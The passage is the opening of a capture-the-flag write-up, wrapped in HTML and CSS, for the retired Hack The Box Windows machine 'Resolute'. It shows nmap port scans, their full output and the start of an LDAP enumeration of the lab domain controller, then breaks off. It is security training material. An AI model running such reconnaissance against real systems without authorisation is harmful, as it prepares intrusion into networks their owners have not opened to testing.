+  .markdown-body abbr[title]:after {
+    content: " (" attr(title) ")";
+  }
+
+  .markdown-body .ir a:after,
+  .markdown-body a[href^="javascript:"]:after,
+  .markdown-body a[href^="#"]:after {
+    content: "";
+  }
+
+  .markdown-body pre {
+    white-space: pre;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+  }
+
+  .markdown-body pre,
+  .markdown-body blockquote {
+    border: 1px solid #999;
+    padding-right: 1em;
+    page-break-inside: avoid;
+  }
+
+  .markdown-body .progress,
+  .markdown-body .progress-bar {
+    -moz-box-shadow: none;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+  }
+
+  .markdown-body .progress {
+    border: 1px solid #ddd;
+  }
+
+  .markdown-body .progress-bar {
+    height: 22px;
+    border-right: 1px solid #ddd;
+  }
+
+  .markdown-body tr,
+  .markdown-body img {
+    page-break-inside: avoid;
+  }
+
+  .markdown-body img {
+    max-width: 100% !important;
+  }
+
+  .markdown-body p,
+  .markdown-body h2,
+  .markdown-body h3 {
+    orphans: 3;
+    widows: 3;
+  }
+
+  .markdown-body h2,
+  .markdown-body h3 {
+    page-break-after: avoid;
+  }
+}
+</style><style>/*GitHub*/
+.codehilite {background-color:#fff;color:#333333;}
+.codehilite .hll {background-color:#ffffcc;}
+.codehilite .c{color:#999988;font-style:italic}
+.codehilite .err{color:#a61717;background-color:#e3d2d2}
+.codehilite .k{font-weight:bold}
+.codehilite .o{font-weight:bold}
+.codehilite .cm{color:#999988;font-style:italic}
+.codehilite .cp{color:#999999;font-weight:bold}
+.codehilite .c1{color:#999988;font-style:italic}
+.codehilite .cs{color:#999999;font-weight:bold;font-style:italic}
+.codehilite .gd{color:#000000;background-color:#ffdddd}
+.codehilite .ge{font-style:italic}
+.codehilite .gr{color:#aa0000}
+.codehilite .gh{color:#999999}
+.codehilite .gi{color:#000000;background-color:#ddffdd}
+.codehilite .go{color:#888888}
+.codehilite .gp{color:#555555}
+.codehilite .gs{font-weight:bold}
+.codehilite .gu{color:#800080;font-weight:bold}
+.codehilite .gt{color:#aa0000}
+.codehilite .kc{font-weight:bold}
+.codehilite .kd{font-weight:bold}
+.codehilite .kn{font-weight:bold}
+.codehilite .kp{font-weight:bold}
+.codehilite .kr{font-weight:bold}
+.codehilite .kt{color:#445588;font-weight:bold}
+.codehilite .m{color:#009999}
+.codehilite .s{color:#dd1144}
+.codehilite .n{color:#333333}
+.codehilite .na{color:teal}
+.codehilite .nb{color:#0086b3}
+.codehilite .nc{color:#445588;font-weight:bold}
+.codehilite .no{color:teal}
+.codehilite .ni{color:purple}
+.codehilite .ne{color:#990000;font-weight:bold}
+.codehilite .nf{color:#990000;font-weight:bold}
+.codehilite .nn{color:#555555}
+.codehilite .nt{color:navy}
+.codehilite .nv{color:teal}
+.codehilite .ow{font-weight:bold}
+.codehilite .w{color:#bbbbbb}
+.codehilite .mf{color:#009999}
+.codehilite .mh{color:#009999}
+.codehilite .mi{color:#009999}
+.codehilite .mo{color:#009999}
+.codehilite .sb{color:#dd1144}
+.codehilite .sc{color:#dd1144}
+.codehilite .sd{color:#dd1144}
+.codehilite .s2{color:#dd1144}
+.codehilite .se{color:#dd1144}
+.codehilite .sh{color:#dd1144}
+.codehilite .si{color:#dd1144}
+.codehilite .sx{color:#dd1144}
+.codehilite .sr{color:#009926}
+.codehilite .s1{color:#dd1144}
+.codehilite .ss{color:#990073}
+.codehilite .bp{color:#999999}
+.codehilite .vc{color:teal}
+.codehilite .vg{color:teal}
+.codehilite .vi{color:teal}
+.codehilite .il{color:#009999}
+.codehilite .gc{color:#999;background-color:#EAF2F5}
+</style><title>writeup</title></head><body><article class="markdown-body"><h1 id="resolute">Resolute<a class="headerlink" href="#resolute" title="Permanent link"></a></h1>
+<p><br/></p>
+<p><img alt="info" src="https://github.com/VitthalS/VitthalS.github.io/raw/master/writeups/resolute/info.png" /></p>
+<p><br/>
+Resolute was retired .It was easy and fun Windows box with techniques so let&rsquo;s get started start &hellip;<br/></p>
+<h2 id="reconnaissance">Reconnaissance<a class="headerlink" href="#reconnaissance" title="Permanent link"></a></h2>
+<p>Run the <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a> script to enumerate open ports and services running on those ports.</p>
+<p><code>nmapAutomator.sh 10.10.10.169 All</code></p>
+<p>All: Runs all the scans consecutively.
+We get back the following result.</p>
+<div class="codehilite"><pre>Running all scans on 10.10.10.169
+
+Host is likely running Windows
+
+
+
+---------------------Starting Nmap Quick Scan---------------------
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:03 IST
+Nmap scan report for 10.10.10.169
+Host is up (0.16s latency).
+Not shown: 989 closed ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+
+Nmap done: 1 IP address (1 host up) scanned in 8.40 seconds
+
+
+
+---------------------Starting Nmap Basic Scan---------------------
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:03 IST
+Nmap scan report for 10.10.10.169
+Host is up (0.16s latency).
+
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-05 13:39:15Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=5/5%Time=5EB16B3C%P=x86_64-pc-linux-gnu%r(DNSVe
+SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
+SF:04bind\0\0\x10\0\x03&quot;);
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h25m32s, deviation: 4h02m30s, median: 5m31s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE\x00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System time: 2020-05-05T06:40:05-07:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-05-05T13:40:06
+|_  start_date: 2020-05-05T13:37:58
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 191.67 seconds
+
+
+
+----------------------Starting Nmap UDP Scan----------------------
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:06 IST
+Warning: 10.10.10.169 giving up on port because retransmission cap hit (1).
+Nmap scan report for 10.10.10.169
+Host is up (0.15s latency).
+Not shown: 827 open|filtered ports, 167 closed ports
+PORT      STATE SERVICE
+123/udp   open  ntp
+389/udp   open  ldap
+52225/udp open  unknown
+61961/udp open  unknown
+62699/udp open  unknown
+64590/udp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 168.14 seconds
+
+
+Making a script scan on UDP ports: 123, 389, 52225, 61961, 62699, 64590
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:09 IST
+Nmap scan report for 10.10.10.169
+Host is up (0.15s latency).
+
+PORT      STATE  SERVICE VERSION
+123/udp   open   ntp     NTP v3
+389/udp   open   ldap    Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+52225/udp closed unknown
+61961/udp open   domain  (generic dns response: SERVFAIL)
+| fingerprint-strings: 
+|   NBTStat: 
+|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+62699/udp open   domain  (generic dns response: SERVFAIL)
+| fingerprint-strings: 
+|   NBTStat: 
+|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+64590/udp closed unknown
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port61961-UDP:V=7.80%I=7%D=5/5%Time=5EB16CB0%P=x86_64-pc-linux-gnu%r(NB
+SF:TStat,32,&quot;\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAA
+SF:AAAAAAAAA\0\0!\0\x01&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port62699-UDP:V=7.80%I=7%D=5/5%Time=5EB16CB0%P=x86_64-pc-linux-gnu%r(NB
+SF:TStat,32,&quot;\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAA
+SF:AAAAAAAAA\0\0!\0\x01&quot;);
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.23 seconds
+
+
+
+---------------------Starting Nmap Full Scan----------------------
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:10 IST
+Initiating Parallel DNS resolution of 1 host. at 19:10
+Completed Parallel DNS resolution of 1 host. at 19:10, 0.00s elapsed
+Initiating SYN Stealth Scan at 19:10
+Scanning 10.10.10.169 [65535 ports]
+Discovered open port 445/tcp on 10.10.10.169
+Discovered open port 139/tcp on 10.10.10.169
+Discovered open port 53/tcp on 10.10.10.169
+Discovered open port 135/tcp on 10.10.10.169
+Warning: 10.10.10.169 giving up on port because retransmission cap hit (1).
+SYN Stealth Scan Timing: About 18.58% done; ETC: 19:12 (0:02:16 remaining)
+Discovered open port 636/tcp on 10.10.10.169
+Discovered open port 49665/tcp on 10.10.10.169
+SYN Stealth Scan Timing: About 38.68% done; ETC: 19:13 (0:01:56 remaining)
+Discovered open port 88/tcp on 10.10.10.169
+SYN Stealth Scan Timing: About 54.90% done; ETC: 19:13 (0:01:25 remaining)
+Discovered open port 50056/tcp on 10.10.10.169
+Discovered open port 49676/tcp on 10.10.10.169
+Discovered open port 49667/tcp on 10.10.10.169
+Discovered open port 49712/tcp on 10.10.10.169
+Discovered open port 49666/tcp on 10.10.10.169
+SYN Stealth Scan Timing: About 67.38% done; ETC: 19:13 (0:01:04 remaining)
+Discovered open port 3268/tcp on 10.10.10.169
+Discovered open port 49688/tcp on 10.10.10.169
+Discovered open port 49669/tcp on 10.10.10.169
+Discovered open port 50100/tcp on 10.10.10.169
+Discovered open port 9389/tcp on 10.10.10.169
+SYN Stealth Scan Timing: About 78.53% done; ETC: 19:14 (0:00:54 remaining)
+Discovered open port 5985/tcp on 10.10.10.169
+SYN Stealth Scan Timing: About 84.36% done; ETC: 19:15 (0:00:47 remaining)
+Discovered open port 389/tcp on 10.10.10.169
+SYN Stealth Scan Timing: About 88.93% done; ETC: 19:15 (0:00:37 remaining)
+Discovered open port 464/tcp on 10.10.10.169
+Discovered open port 3269/tcp on 10.10.10.169
+Discovered open port 49677/tcp on 10.10.10.169
+Discovered open port 47001/tcp on 10.10.10.169
+Discovered open port 593/tcp on 10.10.10.169
+Discovered open port 49664/tcp on 10.10.10.169
+Completed SYN Stealth Scan at 19:17, 445.58s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.169
+Host is up (0.16s latency).
+Not shown: 65463 closed ports
+PORT      STATE    SERVICE
+53/tcp    open     domain
+88/tcp    open     kerberos-sec
+135/tcp   open     msrpc
+139/tcp   open     netbios-ssn
+389/tcp   open     ldap
+445/tcp   open     microsoft-ds
+464/tcp   open     kpasswd5
+593/tcp   open     http-rpc-epmap
+636/tcp   open     ldapssl
+1525/tcp  filtered orasrv
+2154/tcp  filtered stdptc
+3168/tcp  filtered poweronnud
+3268/tcp  open     globalcatLDAP
+3269/tcp  open     globalcatLDAPssl
+3918/tcp  filtered pktcablemmcops
+5698/tcp  filtered unknown
+5985/tcp  open     wsman
+7226/tcp  filtered unknown
+7487/tcp  filtered unknown
+7779/tcp  filtered vstat
+9389/tcp  open     adws
+10038/tcp filtered unknown
+12089/tcp filtered unknown
+12824/tcp filtered unknown
+13219/tcp filtered unknown
+13727/tcp filtered unknown
+13989/tcp filtered unknown
+14175/tcp filtered unknown
+14343/tcp filtered unknown
+17262/tcp filtered unknown
+21709/tcp filtered unknown
+23410/tcp filtered unknown
+25649/tcp filtered unknown
+26850/tcp filtered unknown
+27482/tcp filtered unknown
+31779/tcp filtered unknown
+32947/tcp filtered unknown
+33925/tcp filtered unknown
+34225/tcp filtered unknown
+35137/tcp filtered unknown
+35196/tcp filtered unknown
+35927/tcp filtered unknown
+36785/tcp filtered unknown
+37829/tcp filtered unknown
+38939/tcp filtered unknown
+40467/tcp filtered unknown
+43203/tcp filtered unknown
+44300/tcp filtered unknown
+47001/tcp open     winrm
+47906/tcp filtered unknown
+48217/tcp filtered unknown
+48511/tcp filtered unknown
+49664/tcp open     unknown
+49665/tcp open     unknown
+49666/tcp open     unknown
+49667/tcp open     unknown
+49669/tcp open     unknown
+49676/tcp open     unknown
+49677/tcp open     unknown
+49688/tcp open     unknown
+49712/tcp open     unknown
+50056/tcp open     unknown
+50100/tcp open     unknown
+51840/tcp filtered unknown
+53485/tcp filtered unknown
+54727/tcp filtered unknown
+57381/tcp filtered unknown
+58138/tcp filtered unknown
+59339/tcp filtered unknown
+63264/tcp filtered unknown
+63395/tcp filtered unknown
+65182/tcp filtered unknown
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 445.73 seconds
+           Raw packets sent: 73743 (3.245MB) | Rcvd: 73508 (2.940MB)
+
+
+Making a script scan on extra ports: 5985, 9389, 47001, 49664, 49665, 49666, 49667, 49669, 49676, 49677, 49688, 49712, 50056, 50100
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:17 IST
+Nmap scan report for 10.10.10.169
+Host is up (0.21s latency).
+
+PORT      STATE  SERVICE    VERSION
+5985/tcp  open   http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open   mc-nmf     .NET Message Framing
+47001/tcp open   http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open   msrpc      Microsoft Windows RPC
+49665/tcp open   msrpc      Microsoft Windows RPC
+49666/tcp open   msrpc      Microsoft Windows RPC
+49667/tcp open   msrpc      Microsoft Windows RPC
+49669/tcp open   msrpc      Microsoft Windows RPC
+49676/tcp open   ncacn_http Microsoft Windows RPC over HTTP 1.0
+49677/tcp open   msrpc      Microsoft Windows RPC
+49688/tcp open   msrpc      Microsoft Windows RPC
+49712/tcp open   msrpc      Microsoft Windows RPC
+50056/tcp closed unknown
+50100/tcp closed unknown
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 65.04 seconds
+
+
+
+---------------------Starting Nmap Vulns Scan---------------------
+
+Running CVE scan on all ports
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:18 IST
+Nmap scan report for 10.10.10.169
+Host is up (0.27s latency).
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-05 13:54:12Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49688/tcp open  msrpc        Microsoft Windows RPC
+49712/tcp open  msrpc        Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=5/5%Time=5EB16EBC%P=x86_64-pc-linux-gnu%r(DNSVe
+SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
+SF:04bind\0\0\x10\0\x03&quot;);
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 62.26 seconds
+
+
+Running Vuln scan on all ports
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:19 IST
+Nmap scan report for 10.10.10.169
+Host is up (0.17s latency).
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain?
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-05 13:55:24Z)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+135/tcp   open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_sslv2-drown: 
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+464/tcp   open  kpasswd5?
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+636/tcp   open  tcpwrapped
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+|_sslv2-drown: 
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_sslv2-drown: 
+3269/tcp  open  tcpwrapped
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+|_sslv2-drown: 
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
+9389/tcp  open  mc-nmf       .NET Message Framing
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
+49664/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49665/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49666/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49667/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49669/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49677/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49688/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+49712/tcp open  msrpc        Microsoft Windows RPC
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=5/5%Time=5EB16F04%P=x86_64-pc-linux-gnu%r(DNSVe
+SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
+SF:04bind\0\0\x10\0\x03&quot;);
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1215.54 seconds
+
+---------------------Finished all Nmap scans---------------------
+
+root@kali:~/htb/resolute$ 
+</pre></div>
+
+<p>We have 23 ports open.</p>
+<ul>
+<li><strong>Port 53 :</strong> running DNS</li>
+<li><strong>Port 88:</strong> running Microsoft Windows Kerberos</li>
+<li><strong>Ports 139 &amp; 445:</strong> running SMB</li>
+<li><strong>Ports 389 &amp; 3268:</strong> running Microsoft Windows Active Directory LDAP</li>
+<li><strong>Port 464:</strong> running kpasswd5</li>
+<li><strong>Ports 593 &amp; 49676:</strong> running ncacn_http</li>
+<li><strong>Ports 636 &amp; 3269:</strong> running tcpwrapped</li>
+<li><strong>Port 9389 :</strong> running .NET Message Framing</li>
+<li><strong>Ports 5985 &amp; 47001 :</strong> running Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</li>
+<li><strong>Ports 135,49664,49665,49666,49667,49669,49677,49688,49712:</strong> running Microsoft Windows RPC</li>
+</ul>
+<p>Before we move on to enumeration, let’s observe the scan results.</p>
+<ul>
+<li>Since the Kerberos and LDAP services are running, chances are we’re dealing with a Windows Active Directory box.</li>
+<li>The nmap scan leaks the domain and hostname: megabank.local. Similarly, the SMB OS nmap scan leaks the operating system: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3).</li>
+<li>Port 389 is running LDAP. We’ll need to query it for any useful information. Same goes for SMB.</li>
+<li>If we find credentials through SMB or LDAP, we can use these services to remotely connect to the box.</li>
+</ul>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link"></a></h2>
+<p>We’ll start off with enumerating LDAP.</p>
+<h3 id="port-389-ldap">Port 389 LDAP<a class="headerlink" href="#port-389-ldap" title="Permanent link"></a></h3>
+<p>Nmap has an NSE script that enumerates LDAP.</p>
+<div class="codehilite"><pre>root@kali:# locate ldap-search /usr/share/nmap/scripts/ldap-search.nse
+</pre></div>
+
+<p>Let’s run the script on port 389.</p>
+<div class="codehilite"><pre>root@kali:~/htb$ nmap -p 389 --script ldap-search 10.10.10.169
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-06 18:32 IST
+Nmap scan report for 10.10.10.169
+Host is up (0.18s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-search: 
+|   Context: DC=megabank,DC=local
+|     dn: DC=megabank,DC=local
+|         objectClass: top
+|         objectClass: domain
+|         objectClass: domainDNS
+|         distinguishedName: DC=megabank,DC=local
+|         instanceType: 5
+|         whenCreated: 2019/09/25 13:28:22 UTC
+|         whenChanged: 2020/05/06 12:30:32 UTC
+|         subRefs: DC=ForestDnsZones,DC=megabank,DC=local
+|         subRefs: DC=DomainDnsZones,DC=megabank,DC=local
+|         subRefs: CN=Configuration,DC=megabank,DC=local
+|         uSNCreated: 4099
+|         \x19\x9A\xF2\xBC
+|         uSNChanged: 147500
+|         name: megabank
+|         objectGUID: b4e0e946-e7cb-b742-8fa0-5c4cec2fe5aa
+|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00;\xFE\xC7\x0EMO\x9F@\x81\xB6~\xC4\x91\xD3R\x8C\x1A\xC0\x01\x00\x00\x00\x00\x00\x0Cs\xF7\x13\x03\x00\x00\x00\xC2\x1D)\x1D\xC8\x1B\xD9G\xA2\xBCRK\xE1\x0F\x10d\x08\xA0\x00\x00\x00\x00\x00\x00\x115\x9F\x13\x03\x00\x00\x00p\x11cD\x9C\x9F\xC9N\xA6k\&lt;\xDE\xBB\xAB|\x1C\xE0\x01\x00\x00\x00\x00\x00F{\xF7\x13\x03\x00\x00\x00\xAA8\x88adCkM\xB6\xD63\x9EGMk\xC8\x07\x90\x00\x00\x00\x00\x00\x00Z0\x9F\x13\x03\x00\x00\x00\x05\xA2\xB2b\xFB)\x86A\xB05\xFD\xBE\x97\xF4\xCEq  \xB0\x00\x00\x00\x00\x00\x00\xD07\x9F\x13\x03\x00\x00\x00`\x9D\x0Ee\xB3T\xBDE\xB4g\x88\x07\x05\xFCI\xE1\x05p\x00\x00\x00\x00\x00\x00&lt; \x9F\x13\x03\x00\x00\x00\xD9
+|         cjy\xA3\xC2I\x89d\xE1om\x86\xB0Y\x1F\x10\x02\x00\x00\x00\x00\x00\xF1.\xF8\x13\x03\x00\x00\x0068\xC9\x82\x1E\xBD\xD2N\x92\x1CL\xAF\xF2=\xC6o\x0C\xE0\x00\x00\x00\x00\x00\x00@\x1F\xE6\x13\x03\x00\x00\x00\x11:\x85\x83#\x98\xDAJ\xAA\x83\xE6\xF7%{w\xC1\x18\xA0\x01\x00\x00\x00\x00\x00
+|         i\xF7\x13\x03\x00\x00\x00\xD0\xBBK\x8B\xF5\xB5\xD5D\xBE\xF9\xD7\x92\xCEz?;\x1B\xD0\x01\x00\x00\x00\x00\x00vw\xF7\x13\x03\x00\x00\x00
+|         n\xF7\x13\x03\x00\x00\x00%}:\xF7\xE0\xF6\xEFM\xB2\xE2\xDD\x80.\xF0*\xB3\x17\x90\x01\x00\x00\x00\x00\x00\xBB`\xF7\x13\x03\x00\x00\x00\xF90\xC0\xFF\x9Df\xB6K\x939WR\x81\xC5P\xA6\x1E\x00\x02\x00\x00\x00\x00\x00\x07\x1D\xF8\x13\x03\x00\x00\x00
+|         creationTime: 132332418321584084
+|         forceLogoff: -9223372036854775808
+|         lockoutDuration: -18000000000
+|         lockOutObservationWindow: -18000000000
+|         lockoutThreshold: 0
+|         maxPwdAge: -9223372036854775808
+|         minPwdAge: -864000000000
+|         minPwdLength: 7
+|         modifiedCountAtLastProm: 0
+|         nextRid: 1000
+|         pwdProperties: 0
+|         pwdHistoryLength: 24
+|         objectSid: 1-5-21-1392959593-3013219662-3596683436
+|         serverState: 1
+|         uASCompat: 1
+|         modifiedCount: 1
+|         auditingPolicy: \x00\x01
+|         nTMixedDomain: 0
+|         rIDManagerReference: CN=RID Manager$,CN=System,DC=megabank,DC=local
+|         fSMORoleOwner: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
+|         systemFlags: -1946157056
+|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=megabank,DC=local
+|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=megabank,DC=local
